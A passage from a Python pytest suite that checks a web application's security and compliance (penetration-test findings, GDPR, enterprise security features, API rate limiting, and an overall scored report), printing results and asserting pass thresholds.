        for framework in self.compliance_frameworks:
            framework_score = 0
            framework_tests = 0
            
            for result in test_results:
                if result.compliance_status:
                    framework_tests += 1
                    framework_score += sum(result.compliance_status.values()) / len(result.compliance_status)
            
            if framework_tests > 0:
                compliance_scores[framework] = (framework_score / framework_tests) * 100
            else:
                compliance_scores[framework] = 0
        
        # Aggregate recommendations
        all_recommendations = []
        for result in test_results:
            all_recommendations.extend(result.recommendations)
        
        # Remove duplicates
        unique_recommendations = list(set(all_recommendations))
        
        return SecurityAssessmentReport(
            overall_security_score=overall_security_score,
            critical_issues=severity_counts["critical"],
            high_issues=severity_counts["high"],
            medium_issues=severity_counts["medium"],
            low_issues=severity_counts["low"],
            test_results=test_results,
            compliance_scores=compliance_scores,
            recommendations=unique_recommendations
        )


@pytest.mark.asyncio
class TestSecurityComplianceValidation:
    """Comprehensive Security and Compliance Validation Tests"""
    
    @pytest.fixture
    def validator(self, test_client):
        """Create security compliance validator"""
        return SecurityComplianceValidator(test_client)
    
    async def test_penetration_testing_assessment(self, validator):
        """Test comprehensive penetration testing and vulnerability assessment"""
        result = await validator.penetration_testing_assessment()
        
        print(f"\n🔒 PENETRATION TESTING ASSESSMENT RESULTS")
        print(f"✅ Success: {result.success}")
        print(f"🚨 Severity: {result.severity}")
        print(f"📝 Description: {result.description}")
        print(f"🔍 Vulnerabilities found: {len(result.vulnerabilities_found)}")
        
        if result.vulnerabilities_found:
            print("⚠️ Vulnerabilities:")
            for vuln in result.vulnerabilities_found:
                print(f"  - {vuln}")
        
        if result.recommendations:
            print("💡 Recommendations:")
            for rec in result.recommendations:
                print(f"  - {rec}")
        
        # Assertions for security requirements
        assert result.severity != "critical", f"Critical security vulnerabilities found: {result.vulnerabilities_found}"
        
        # Allow medium severity issues but warn about them
        if result.severity in ["high", "medium"]:
            logger.warning(f"Security issues found (severity: {result.severity}): {result.vulnerabilities_found}")
        
        # Must not have SQL injection vulnerabilities
        sql_injection_vulns = [v for v in result.vulnerabilities_found if "SQL injection" in v]
        assert len(sql_injection_vulns) == 0, f"SQL injection vulnerabilities found: {sql_injection_vulns}"
    
    async def test_gdpr_privacy_compliance(self, validator):
        """Test GDPR and privacy compliance features"""
        result = await validator.gdpr_privacy_compliance_test()
        
        print(f"\n🛡️ GDPR PRIVACY COMPLIANCE RESULTS")
        print(f"✅ Success: {result.success}")
        print(f"🚨 Severity: {result.severity}")
        print(f"📝 Description: {result.description}")
        
        if result.compliance_status:
            print("📋 Compliance status:")
            for check, status in result.compliance_status.items():
                status_icon = "✅" if status else "❌"
                print(f"  {status_icon} {check}: {'COMPLIANT' if status else 'NON-COMPLIANT'}")
        
        if result.recommendations:
            print("💡 Recommendations:")
            for rec in result.recommendations:
                print(f"  - {rec}")
        
        # Assertions for GDPR compliance
        # For MVP stage, we allow some non-compliance but critical features must be planned
        if result.severity == "critical":
            logger.warning(f"Critical GDPR compliance issues: {result.vulnerabilities_found}")
        
        # At minimum, basic privacy features should be considered
        assert result.success or result.severity != "critical", f"Critical GDPR compliance failures: {result.description}"
    
    async def test_enterprise_security_features(self, validator):
        """Test enterprise-grade security features"""
        result = await validator.enterprise_security_features_test()
        
        print(f"\n🏢 ENTERPRISE SECURITY FEATURES RESULTS")
        print(f"✅ Success: {result.success}")
        print(f"🚨 Severity: {result.severity}")
        print(f"📝 Description: {result.description}")
        
        if result.compliance_status:
            print("🔐 Security features status:")
            for feature, available in result.compliance_status.items():
                status_icon = "✅" if available else "❌"
                print(f"  {status_icon} {feature}: {'AVAILABLE' if available else 'MISSING'}")
        
        if result.recommendations:
            print("💡 Recommendations:")
            for rec in result.recommendations:
                print(f"  - {rec}")
        
        # Assertions for enterprise security
        # Basic security features should be implemented or planned
        assert result.severity != "critical", f"Critical enterprise security gaps: {result.vulnerabilities_found}"
        
        # Security headers should be implemented
        if result.compliance_status and "security_headers" in result.compliance_status:
            assert result.compliance_status["security_headers"], "Security headers must be implemented"
    
    async def test_api_security_rate_limiting(self, validator):
        """Test API security and rate limiting"""
        result = await validator.api_security_rate_limiting_test()
        
        print(f"\n🌐 API SECURITY & RATE LIMITING RESULTS")
        print(f"✅ Success: {result.success}")
        print(f"🚨 Severity: {result.severity}")
        print(f"📝 Description: {result.description}")
        
        if result.compliance_status:
            print("🔒 API security status:")
            for check, status in result.compliance_status.items():
                status_icon = "✅" if status else "❌"
                print(f"  {status_icon} {check}: {'SECURE' if status else 'VULNERABLE'}")
        
        if result.recommendations:
            print("💡 Recommendations:")
            for rec in result.recommendations:
                print(f"  - {rec}")
        
        # Assertions for API security
        assert result.severity != "critical", f"Critical API security issues: {result.vulnerabilities_found}"
        
        # API authentication should be properly implemented
        if result.compliance_status and "api_authentication" in result.compliance_status:
            assert result.compliance_status["api_authentication"], "API authentication must be properly implemented"
    
    async def test_comprehensive_security_assessment(self, validator):
        """Test comprehensive security assessment report generation"""
        report = await validator.generate_security_assessment_report()
        
        print(f"\n📊 COMPREHENSIVE SECURITY ASSESSMENT REPORT")
        print(f"🏆 Overall Security Score: {report.overall_security_score:.1f}%")
        print(f"🔴 Critical Issues: {report.critical_issues}")
        print(f"🟠 High Issues: {report.high_issues}")
        print(f"🟡 Medium Issues: {report.medium_issues}")
        print(f"🟢 Low Issues: {report.low_issues}")
        
        print("\n📋 Compliance Scores:")
        for framework, score in report.compliance_scores.items():
            print(f"  📖 {framework}: {score:.1f}%")
        
        print(f"\n🧪 Test Results Summary:")
        for result in report.test_results:
            status_icon = "✅" if result.success else "❌"
            print(f"  {status_icon} {result.test_name}: {result.severity} - {result.description}")
        
        if report.recommendations:
            print("\n💡 Top Recommendations:")
            for i, rec in enumerate(report.recommendations[:10], 1):  # Show top 10
                print(f"  {i}. {rec}")
        
        # Assertions for overall security
        assert report.critical_issues == 0, f"Critical security issues must be resolved: {report.critical_issues}"
        assert report.overall_security_score >= 60, f"Overall security score too low: {report.overall_security_score:.1f}%"
        
        # At least some compliance frameworks should have reasonable scores
        compliance_average = sum(report.compliance_scores.values()) / len(report.compliance_scores) if report.compliance_scores else 0
        assert compliance_average >= 50, f"Compliance scores too low: {compliance_average:.1f}%"


if __name__ == "__main__":
    # Allow running this test file directly
    import subprocess
    import sys
    
    print("🧪 Running comprehensive security and compliance tests...")
    
    result = subprocess.run([
        sys.executable, "-m", "pytest",
        __file__,
        "-v",
        "--tb=short",
        "-s"  # Show print statements
    ])
    
    sys.exit(result.returncode)